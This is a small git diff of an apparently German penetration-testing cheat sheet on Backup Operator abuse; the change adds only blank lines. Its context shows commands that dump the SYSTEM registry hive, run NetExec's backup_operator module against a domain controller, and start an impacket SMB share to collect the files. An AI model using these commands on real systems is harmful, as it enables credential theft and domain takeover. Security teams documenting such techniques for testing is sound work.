@@ -33,6 +33,8 @@ reg save hklm\system c:\Temp\security
 nxc smb <IP-DC> -u <USER> -p <PASS> -M backup_operator
 ```
 
+
+
 ## Methode 2: impact-reg + SMB server 
 ```
 impacket-smbserver share $(pwd) -smb2support
